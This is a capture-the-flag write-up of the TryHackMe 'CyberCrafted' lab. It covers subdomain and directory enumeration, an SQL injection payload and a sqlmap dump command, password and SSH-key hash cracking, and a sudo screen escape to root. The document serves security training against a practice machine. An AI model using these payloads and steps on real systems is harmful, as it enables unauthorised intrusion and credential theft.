---
title: "TryHackMe - CyberCrafted"
author: Nasrallah
description: ""
date: 2022-12-01 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, subdomain, sudo]
img_path: /assets/img/tryhackme/cybercrafted
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [CyberCrafted](https://tryhackme.com/room/cybercrafted) from [TryHackMe](https://tryhackme.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 -p- {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

- -p-: Scan all ports.

```terminal
Nmap scan report for 10.10.48.79 (10.10.48.79)
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3736ceb9ac728ad7a6b78e45d0ce3c00 (RSA)
|   256 e9e7338a77282cd48c6d8a2ce7889530 (ECDSA)
|_  256 76a2b1cf1b3dce6c60f563243eef70d8 (ED25519)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://cybercrafted.thm/
|_http-server-header: Apache/2.4.29 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found tree open ports, 22 running OpenSSH, 80 running Apache web server and 25565 running a minecraft server.

### Web

As we can see from the nmap scan, when we navigate to the web page we get redirected to `cybercrafted.thm`, so let's add that domain to our /etc/hosts file and navigate to it.

![](1.png)

We see the welcome page of CyberCrafted, nothing really interesting so let's check the source code.

![](2.png)

We found a note stating that there are other subdomains.

### Ffuf

Let's scan for subdomains using the following command:

```bash
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cybercrafted.thm -H "Host: FUZZ.cybercrafted.thm" --fw 1
```

![](3.png)

We found two interesting subdomains, `admin` and `store`. Let's add them to /etc/hosts file and check them.

![](4.png)

On the admin subdomain, we find a login page, but on `store` we can't even access the index page.

### Gobuster

Let's run a directory/file scan on the store subdomain using the following command:

```bash
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2022/10/29 03:57:30 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 287]
/.hta                 (Status: 403) [Size: 287]
/.hta.txt             (Status: 403) [Size: 287]
/.htaccess            (Status: 403) [Size: 287]
/.htaccess.txt        (Status: 403) [Size: 287]
/.htaccess.php        (Status: 403) [Size: 287]
/.hta.php             (Status: 403) [Size: 287]
/.htpasswd            (Status: 403) [Size: 287]
/.htpasswd.txt        (Status: 403) [Size: 287]
/.htpasswd.php        (Status: 403) [Size: 287]
/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
/index.html           (Status: 403) [Size: 287]
/search.php           (Status: 200) [Size: 838]
/server-status        (Status: 403) [Size: 287]
===============================================================
```

We see that we can access a search page in `/search.php`.

![](5.png)

Searching for random things we get three empty columns.

![](6.png)

Let's test for SQL injection with this payload: `' or 1=1 -- -`

![](7.png)

Great! We managed to dump the hole table and confirm that this search function is vulnerable to injection.

## **Foothold**

### Sqlmap

Now let's run `sqlmap` on this vulnerable page and see what we can find.

```bash
sqlmap -u 'http://store.cybercrafted.thm/search.php' --form --dump --batch
```

![](8.png)

Great! We found a username and a hash.

### John

Let's crack the hash using `john`.

![](9.png)

We got the password, let's login in the admin page.

![](10.png)

We see a place where we can run commands on the system, let's test it by running `whoami`.

![](11.png)

Nice, we can run commands.

Checking different user on the /home directory, we find a user with a world readable ssh private key.

![](12.png)

Let's copy it to our machine and connect with it.

![](13.png)

We found out that the key is protected with a password, so we use `ssh2john` to get a hash of that password, then we crack the hash using `john`.


## **Privilege Escalation**

After we logged in successfully, we saw that we're part of a group called `minecraft`, so we look for directories and file that belong to that group using this command `find / -group minecraft 2>/dev/null` and we find a directory in /opt called minecraft. Let's check it out.

![](14.png)

We found a note stating that there is a new plugin which we managed to find in the plugins directory.

Checking the files of that plugin, we find some interesting stuff.

![](15.png)

We got the password of `cybercrafted`, let's switch to that user.

![](16.png)

Let's check our current privileges with `sudo -l`.

```bash
cybercrafted@cybercrafted:~$ sudo -l
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted

```

We can run `/usr/bin/screen -r cybercrafted` as root which would give us an in-game console where the admin can control the server, to escape that and get a root shell press `ctrl + a` `ctrl + c` which would create a new window accordin to this [page](https://www.pixelbeat.org/lkdb/screen.html).


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
